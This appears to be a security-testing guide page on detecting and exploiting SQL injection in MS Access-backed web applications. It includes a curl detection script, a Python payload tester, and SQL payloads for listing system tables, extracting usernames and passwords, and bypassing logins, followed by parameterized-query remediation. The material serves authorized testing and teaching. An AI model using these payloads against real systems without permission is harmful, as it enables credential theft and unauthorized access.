# WSTG-INPV-05.5: Testing for SQL Injection - MS Access

## Test ID
WSTG-INPV-05.5

## Test Name
Testing for SQL Injection - MS Access

## High-Level Description

Microsoft Access SQL injection testing targets Access databases (Jet/ACE engine) often used in legacy or small-scale web applications. Access has limited features compared to enterprise databases but can still be exploited for data extraction and authentication bypass.

---

## What to Check

- [ ] Access-specific error messages
- [ ] MSysObjects system table
- [ ] IIF() function (Access-specific)
- [ ] TOP keyword instead of LIMIT
- [ ] Date format (#date#)

---

## How to Test

### Step 1: MS Access Detection

```bash
#!/bin/bash
TARGET="https://target.com/product?id="

echo "[*] Testing for MS Access database..."

# Error-based detection
curl -s "${TARGET}'" | grep -iE "Microsoft Access|JET Database|ODBC Microsoft Access|\.mdb"

# Access-specific syntax test
curl -s "${TARGET}' AND IIF(1=1,1,0)=1--"

# TOP keyword (Access uses TOP not LIMIT)
curl -s "${TARGET}' UNION SELECT TOP 1 NULL--"
```

### Step 2: MS Access SQLi Payloads

```python
#!/usr/bin/env python3
"""
MS Access SQL Injection Tester
"""

import requests
import re

class AccessSQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # MS Access error patterns
    ACCESS_ERRORS = [
        r"Microsoft Access Driver",
        r"JET Database Engine",
        r"Access Database Engine",
        r"ODBC Microsoft Access",
        r"Syntax error in query expression",
        r"Operation must use an updateable query",
        r"\.mdb",
        r"\.accdb",
    ]

    # Access-specific payloads
    ACCESS_PAYLOADS = {
        'detection': [
            "' AND IIF(1=1,1,0)=1--",
            "' UNION SELECT NULL FROM MSysObjects--",
        ],
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND IIF(1=1,1,0)=1--", "' AND IIF(1=2,1,0)=1--"),
        ],
        'time_based': [
            # Access doesn't have sleep, use heavy queries
            "' AND (SELECT COUNT(*) FROM MSysObjects AS T1, MSysObjects AS T2, MSysObjects AS T3)>0--",
        ],
    }

    def detect_access(self, param):
        """Detect if backend is MS Access"""
        print(f"[*] Detecting MS Access database...")

        for payload in self.ACCESS_PAYLOADS['detection']:
            try:
                response = self.session.get(self.url, params={param: payload})

                for pattern in self.ACCESS_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] MS Access database detected!")
                        return True

            except Exception as e:
                pass

        return False

    def test_union_based(self, param):
        """Test Access UNION-based injection"""
        print(f"\n[*] Testing MS Access UNION-based injection...")

        for payload in self.ACCESS_PAYLOADS['union_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                if response.status_code == 200:
                    has_error = False
                    for pattern in self.ACCESS_ERRORS:
                        if re.search(pattern, response.text):
                            has_error = True
                            break

                    if not has_error:
                        print(f"[+] UNION injection possible!")
                        self.findings.append({
                            'type': 'MS Access UNION-based SQLi',
                            'payload': payload,
                            'severity': 'Critical'
                        })
                        return True

            except Exception as e:
                pass

        return False

    def run_tests(self, param='id'):
        """Run all Access SQLi tests"""
        if self.detect_access(param):
            self.test_union_based(param)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*50)
        print("MS ACCESS SQL INJECTION REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo MS Access SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")

# Usage
tester = AccessSQLiTester("https://target.com/product")
tester.run_tests(param='id')
```

### Step 3: MS Access Data Extraction

```sql
-- List Tables (requires access to system tables)
SELECT Name FROM MSysObjects WHERE Type=1

-- Extract Data
' UNION SELECT TOP 1 username,password,NULL FROM users--

-- Authentication Bypass
' OR '1'='1
admin'--

-- IIF conditional
' AND IIF((SELECT TOP 1 username FROM users)='admin',1,0)=1--

-- Note: Access has limited functionality
-- No stacked queries
-- No sleep function
-- No file operations
```

---

## Remediation

```vb
' VBScript/ASP - Parameterized queries
Dim cmd
Set cmd = Server.CreateObject("ADODB.Command")
cmd.ActiveConnection = conn
cmd.CommandText = "SELECT * FROM users WHERE id = ?"
cmd.Parameters.Append cmd.CreateParameter("id", 3, 1, , userId)
Set rs = cmd.Execute()
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| MS Access SQLi data extraction | 7.5 | High |
| MS Access auth bypass | 8.1 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-89** | SQL Injection |

---

## Checklist

```
[ ] MS Access database detected
[ ] UNION-based injection tested
[ ] Boolean-based injection tested
[ ] System tables accessed
[ ] Findings documented
```
